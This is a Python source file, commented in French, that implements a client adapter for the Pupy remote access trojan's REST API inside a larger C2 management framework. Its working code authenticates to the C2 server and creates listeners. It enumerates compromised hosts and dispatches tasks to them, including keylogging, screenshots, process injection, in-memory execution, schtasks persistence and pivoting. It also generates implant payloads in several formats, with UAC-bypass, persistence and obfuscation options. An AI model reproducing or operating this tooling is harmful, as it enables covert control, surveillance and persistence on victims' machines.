"""
Pupy — REST API web + Pyro4 RPC (mode legacy).

Pupy (github.com/n1nj4sec/pupy) — RAT Python multiplateforme cross-platform.
Port REST  : 1337  (pupysh --web, API REST Flask)
Port Pyro4 : 9999  (nameserver Pyro4, mode legacy non supporté ici)
Port C2    : configurable (TCP, HTTP, DNS, etc.)

Pupy REST API (mode --web ou wrappé par un proxy) :
  POST /auth/login                 → token JWT
  GET  /api/sessions               → liste des sessions (agents)
  GET  /api/sessions/{id}          → détail d'une session
  POST /api/sessions/{id}/exec     → exécuter une commande
  GET  /api/sessions/{id}/output   → résultat d'une commande
  GET  /api/listeners              → liste des listeners
  POST /api/listeners              → créer un listener
  DELETE /api/listeners/{id}       → arrêter un listener
  POST /api/payloads/generate      → générer un payload
  GET  /api/modules                → liste des modules
  POST /api/sessions/{id}/module   → charger un module
  GET  /api/dnscnc                 → DNS C&C config

Transports Pupy :
  tcp     — connexion TCP directe
  ssl     — TCP avec SSL
  http    — HTTP polling
  websocket — WebSocket
  obfs3   — trafic obfusqué
  scramblesuit — obfuscation avancée
  ec4     — EC4/AES chiffré
"""
from __future__ import annotations

import logging
import uuid
from base64 import b64decode
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import MsfRpcC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)


class PupyC2(MsfRpcC2Interface):
    """
    Pupy C2 — REST API web (--web mode).

    Paramètres extra (config.extra) :
      api_port   : int   — port REST API (défaut: 1337)
      verify_ssl : bool  (défaut: False)
      api_key    : str   — clé API statique (optionnel)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "list_modules", "run_module",
        "screenshot", "keylogger", "migrate", "persistence",
        "reverse_shell", "portforward",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._rest_client: httpx.AsyncClient | None = None
        self._jwt_token:   str = ""

    # ── Connexion (override MsfRpcC2Interface) ────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config  = config
        api_port      = int(config.extra.get("api_port", 1337))
        scheme        = "https" if config.ssl else "http"
        base_url      = f"{scheme}://{config.host}:{api_port}"

        self._rest_client = httpx.AsyncClient(
            base_url=base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
        )

        # Auth statique (api_key)
        api_key = config.extra.get("api_key", "")
        if api_key:
            self._rest_client.headers.update({"X-API-Key": api_key})
            self._jwt_token = api_key
            self._status    = C2Status.CONNECTED
            logger.info("Pupy : connecté via API Key → %s", base_url)
            return True

        # Auth JWT
        try:
            resp = await self._rest_client.post(
                "/auth/login",
                json={
                    "username": config.username or "admin",
                    "password": config.password or "",
                },
            )
        except httpx.ConnectError as exc:
            raise C2ConnectionError(f"Pupy API inaccessible : {exc}") from exc

        if resp.status_code not in (200, 201):
            raise C2AuthError(f"Pupy auth échouée [{resp.status_code}]: {resp.text[:200]}")

        data = resp.json()
        self._jwt_token = (
            data.get("token")
            or data.get("access_token")
            or (data.get("data") or {}).get("token", "")
        )
        if not self._jwt_token:
            raise C2AuthError(f"Token Pupy absent : {data}")

        self._rest_client.headers.update({"Authorization": f"Bearer {self._jwt_token}"})
        self._status = C2Status.CONNECTED
        logger.info("Pupy : connecté via JWT → %s", base_url)
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._rest_client:
            await self._rest_client.aclose()
            self._rest_client = None
        self._jwt_token = ""
        self._status    = C2Status.DISCONNECTED

    async def get_status(self) -> C2Status:
        if not self._rest_client:
            return C2Status.DISCONNECTED
        try:
            resp = await self._rest_client.get("/api/sessions", timeout=5.0)
            return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
        except Exception:
            return C2Status.ERROR

    # ── Helpers REST ──────────────────────────────────────────────────────────

    async def _rest_get(self, path: str, **kwargs: Any) -> Any:
        if not self._rest_client:
            raise C2ConnectionError("Pupy REST client non initialisé")
        resp = await self._rest_client.get(path, **kwargs)
        resp.raise_for_status()
        return resp.json()

    async def _rest_post(self, path: str, **kwargs: Any) -> Any:
        if not self._rest_client:
            raise C2ConnectionError("Pupy REST client non initialisé")
        resp = await self._rest_client.post(path, **kwargs)
        resp.raise_for_status()
        return resp.json()

    async def _rest_delete(self, path: str) -> None:
        if not self._rest_client:
            raise C2ConnectionError("Pupy REST client non initialisé")
        resp = await self._rest_client.delete(path)
        resp.raise_for_status()

    # ── Listeners ─────────────────────────────────────────────────────────────

    # Transports Pupy
    _TRANSPORTS = [
        "ssl", "tcp", "http", "https", "websocket",
        "obfs3", "scramblesuit", "ec4", "rsa", "dnscnc",
    ]

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        transport = config.get("transport", config.get("protocol", "ssl")).lower()
        host      = config.get("bind_host", "0.0.0.0")
        port      = int(config.get("bind_port", 443))
        name      = config.get("name", f"pupy-{transport}-{port}")

        body = {
            "transport":  transport,
            "host":       host,
            "port":       port,
            "name":       name,
            "config":     {
                "dns_domain": config.get("dns_domain", ""),
                "http_host":  config.get("http_host", ""),
                "user_agent": config.get("user_agent", ""),
                "port":       port,
            },
        }

        data = await self._rest_post("/api/listeners", json=body)
        lid  = str(data.get("id") or data.get("listener_id") or uuid.uuid4())
        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port, protocol=transport,
            status="running" if data.get("active", True) else "stopped",
            meta={"transport": transport},
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        try:
            await self._rest_delete(f"/api/listeners/{listener_id}")
            return True
        except Exception as exc:
            logger.error("Pupy remove listener : %s", exc)
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        data  = await self._rest_get("/api/listeners")
        items = data if isinstance(data, list) else data.get("listeners", [])
        return [
            Listener(
                id=str(l.get("id") or uuid.uuid4()),
                name=l.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=l.get("host") or l.get("bind_host", "0.0.0.0"),
                bind_port=int(l.get("port", 443)),
                protocol=l.get("transport") or l.get("protocol", "ssl"),
                status="running" if l.get("active", True) else "stopped",
            )
            for l in items
        ]

    # ── Sessions (agents) ─────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        data  = await self._rest_get("/api/sessions")
        items = data if isinstance(data, list) else data.get("sessions", [])
        return [self._parse_session(s) for s in items]

    def _parse_session(self, s: dict[str, Any]) -> Implant:
        sid = str(s.get("id") or s.get("session_id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        is_root = (
            s.get("is_root") or s.get("root", False)
            or "root" in str(s.get("user", "")).lower()
            or s.get("integrity") in ("SYSTEM", "High")
        )
        integrity = "SYSTEM" if is_root else "USER"

        return Implant(
            id=sid,
            name=f"{s.get('hostname', 'unknown')}-{sid[:6]}",
            c2_type=self._config.c2_type,
            listener_id=str(s.get("listener_id") or s.get("transport", "")),
            external_ip=s.get("ip") or s.get("remote_ip", ""),
            internal_ip=s.get("local_ip") or s.get("internal_ip", ""),
            hostname=s.get("hostname", ""),
            username=s.get("user") or s.get("username", ""),
            os=s.get("os") or s.get("platform", ""),
            arch=s.get("arch", ""),
            pid=int(s.get("pid", 0)),
            process_name=s.get("process") or s.get("exe", ""),
            integrity=integrity,
            last_checkin=_dt(s.get("last_seen") or s.get("last_activity")),
            first_seen=_dt(s.get("connected_at") or s.get("created")),
            active=not bool(s.get("dead") or s.get("closed", False)),
            meta={
                "transport": s.get("transport", ""),
                "python":    s.get("python_version", ""),
                "modules":   s.get("loaded_modules", []),
            },
        )

    # ── Commandes (modules Pupy) ──────────────────────────────────────────────

    _CMD_MAP: dict[str, str] = {
        "shell":      "shell",
        "cmd":        "shell",
        "ps":         "ps",
        "screenshot": "screenshot",
        "keylog":     "keylogger",
        "upload":     "upload",
        "download":   "download",
        "sysinfo":    "sysinfo",
        "migrate":    "migrate",
        "inject":     "inject",
        "persistence":"persistence.schtasks" if True else "persistence",
        "rdp":        "rdp",
        "pivot":      "pivot_bind_tcp",
        "dnscache":   "dns_cache",
        "clipboard":  "clipboard_monitor",
        "memory":     "memory_exec",
        "exit":       "exit",
    }

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        cmd_parts = command.split()
        cmd_lower = cmd_parts[0].lower() if cmd_parts else "shell"
        module    = self._CMD_MAP.get(cmd_lower, "shell")
        extra     = cmd_parts[1:] + args_list

        body: dict[str, Any] = {
            "cmd":     " ".join(extra) if extra else command,
            "timeout": 60,
        }

        # Pour les modules, utiliser l'endpoint module
        if cmd_lower in self._CMD_MAP and cmd_lower not in ("shell", "cmd"):
            data = await self._rest_post(
                f"/api/sessions/{agent_id}/module",
                json={"module": module, "args": extra, "options": {}},
            )
        else:
            data = await self._rest_post(f"/api/sessions/{agent_id}/exec", json=body)

        return Task(
            id=str(data.get("id") or data.get("task_id") or uuid.uuid4()),
            agent_id=agent_id,
            c2_type=str(self._config.c2_type),
            command=command,
            args=args_list,
            status=data.get("status", "queued"),
            meta={"module": module},
        )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        # Chercher la tâche (l'ID session n'est pas forcément connu)
        try:
            data = await self._rest_get(f"/api/tasks/{task_id}")
        except Exception:
            data = {}
        return {
            "task_id": task_id,
            "status":  data.get("status", "unknown"),
            "output":  data.get("output") or data.get("result", ""),
        }

    # ── Payload ───────────────────────────────────────────────────────────────

    _PAYLOAD_FORMATS: dict[str, str] = {
        "exe":    "client.exe",
        "dll":    "client.dll",
        "py":     "client.py",
        "linux":  "client_linux",
        "apk":    "client.apk",
        "ps1":    "client.ps1",
        "rubber": "rubber_ducky.txt",
        "war":    "client.war",
    }

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        fmt          = config.format or "exe"
        listener_id  = config.extra.get("listener_id", "")
        body = {
            "format":      fmt,
            "listener_id": listener_id,
            "os":          config.os or "windows",
            "arch":        config.arch or "x64",
            "obfuscate":   config.obfuscation,
            "name":        self._PAYLOAD_FORMATS.get(fmt, f"client.{fmt}"),
            "options":     {
                "powershell": config.extra.get("powershell", False),
                "uac_bypass": config.extra.get("uac_bypass", False),
                "persistent": config.extra.get("persistent", False),
            },
        }
        data = await self._rest_post("/api/payloads/generate", json=body)
        b64  = data.get("data") or data.get("binary", "")
        if b64:
            return b64decode(b64)
        # Téléchargement par ID
        file_id = data.get("file_id") or data.get("id")
        if file_id and self._rest_client:
            resp = await self._rest_client.get(f"/api/payloads/{file_id}/download")
            return resp.content
        return b""

    # ── Modules ───────────────────────────────────────────────────────────────

    async def list_modules(self) -> list[dict[str, Any]]:
        self._require_connected()
        data  = await self._rest_get("/api/modules")
        items = data if isinstance(data, list) else data.get("modules", [])
        return [
            {
                "name":        m.get("name", ""),
                "category":    m.get("category", ""),
                "description": m.get("description", ""),
                "platform":    m.get("platform", []),
            }
            for m in items
        ]

    async def run_module(
        self, session_id: str, module_name: str, options: dict[str, Any]
    ) -> Task:
        self._require_connected()
        data = await self._rest_post(
            f"/api/sessions/{session_id}/module",
            json={"module": module_name, "options": options},
        )
        return Task(
            id=str(data.get("id") or data.get("task_id") or uuid.uuid4()),
            agent_id=session_id,
            c2_type=str(self._config.c2_type),
            command=f"module:{module_name}",
            status=data.get("status", "queued"),
            meta={"module": module_name},
        )

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
